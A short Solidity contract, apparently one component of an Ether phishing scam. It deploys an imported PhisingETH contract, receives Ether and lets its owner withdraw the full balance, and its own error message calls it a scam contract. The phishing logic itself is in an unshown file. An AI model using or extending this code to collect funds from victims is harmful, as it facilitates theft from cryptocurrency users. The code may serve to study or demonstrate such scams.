// SPDX-License-Identifier: MIT
pragma solidity 0.8.25;

import "./phisingETH.sol";

contract receiver {
    address private owner;
    PhisingETH phising;

    modifier onlyOwner() {
        require(msg.sender == owner, "This is my scam contract hahahhaha");
        _;
    }

    constructor(address _owner, address _receiver) {
        owner = _owner;
        phising = new PhisingETH(_receiver);
    }

    function withdraw() external onlyOwner {
        (bool ok, ) = owner.call{value: address(this).balance}("");
    }

    receive() external payable {}
}
